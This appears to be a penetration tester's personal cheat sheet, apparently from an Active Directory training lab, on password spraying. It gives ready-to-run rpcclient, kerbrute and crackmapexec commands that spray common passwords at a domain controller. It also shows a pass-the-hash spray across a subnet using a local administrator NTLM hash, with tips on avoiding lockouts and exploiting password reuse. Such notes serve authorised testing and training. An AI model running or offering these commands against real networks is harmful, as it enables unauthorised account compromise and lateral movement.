### Attacks
NOTES: 
- Do not lock out accounts! Enumerate password policy (if possible)
- Check for password reuse:
	- password: $desktop@123 = $server@123
	- Usernames: jpaul = same password for admin account jpaul_adm
##### --- RPCCLient ---
```
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```
AUTHORITY NAME response = success

##### --- Kerbrute --- 
```
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
```

##### --- CrackMapExec ---
```
sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
```

## Local Admin Spraying
If we have a local admins hash, we can spray across the subnet in hopes of password reuse on multiple machines.

<Make sure --local-auth is set so accounts are not locked!> 
```
sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
```